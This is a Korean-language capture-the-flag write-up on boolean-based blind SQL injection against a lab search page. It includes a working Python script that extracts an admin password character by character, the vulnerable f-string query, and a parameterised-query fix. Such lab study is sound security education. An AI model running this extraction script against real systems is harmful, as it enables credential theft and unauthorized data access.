# SQL Injection Write-Up

## 개요

- 본 실습에서는 검색 기능에서 발생하는 SQL Injection 취약점을 이용하여 DB 내부 데이터를 추출합니다.
- 응답 결과가 Found / Not found로 나뉘는 구조를 이용하여 참/거짓 기반(Boolean-Based) SQL Injection을 수행합니다.

---

## 원리

- 사용자 입력이 SQL 쿼리에 그대로 포함되면 입력값이 코드처럼 실행됩니다.
- 이를 이용해 조건식을 삽입하고 결과(True/False)에 따라 데이터를 추론합니다.

### 예시

- 참 -> Found
- 거짓 -> Not found

---

## 종류

- Boolean-Based SQL Injection
> 조건의 참/거짓 응답을 이용해 데이터를 추출하는 방식입니다

---

### 비밀번호 추출 (자동화)
```python
import requests
import time

url = "http://host3.dreamhack.games:21460/search"
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

password = ""

for pos in range(1, 17):
    for c in chars:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),{pos},1)='{c}' -- "

        r = requests.post(url, data={"query": payload})

        print("TRY:", pos, c)

        if "Data exists" in r.text:
            password += c
            print("FOUND:", password)
            break

    time.sleep(0.2)

print("PASSWORD:", password)
```
### 설명

- SUBSTRING으로 한 글자씩 비교합니다
- pos -> 위치
- c -> 후보 문자 (대소문자와 숫자)
- 응답이 참이면 해당 문자 확정입니다

## 특징

- 참/거짓 응답만으로 데이터 추출이 가능합니다
- 직접 데이터 출력이 없어도 공격 가능합니다
- 자동화 스크립트로 빠르게 추출 가능합니다

---

## 취약점 원인

### 취약 코드
```python
sql = f"SELECT COUNT(*) FROM secret_data WHERE title LIKE '%{query}%'"
```
- 사용자 입력이 그대로 SQL에 삽입됩니다
- 입력값이 SQL 코드로 실행됩니다

---

## 해결 방법
```python
sql = "SELECT COUNT(*) FROM secret_data WHERE title LIKE ?"
cursor.execute(sql, (f"%{query}%",))
```
- 파라미터 바인딩 방식 적용입니다
- 사용자 입력을 코드가 아닌 데이터로 처리합니다

### 파라미터 바인딩이란?

- SQL 구조를 먼저 컴파일하고 입력값을 나중에 바인딩하여 DB가 값을 단순 데이터로 처리하게 만들어 SQL Injection을 차단하는 방식입니다

---

## 정리

- SQL Injection은 입력값 검증이 없을 때 발생합니다
- Boolean 기반 공격으로 데이터 추출이 가능합니다
- 파라미터 바인딩을 사용하면 근본적으로 차단 가능합니다
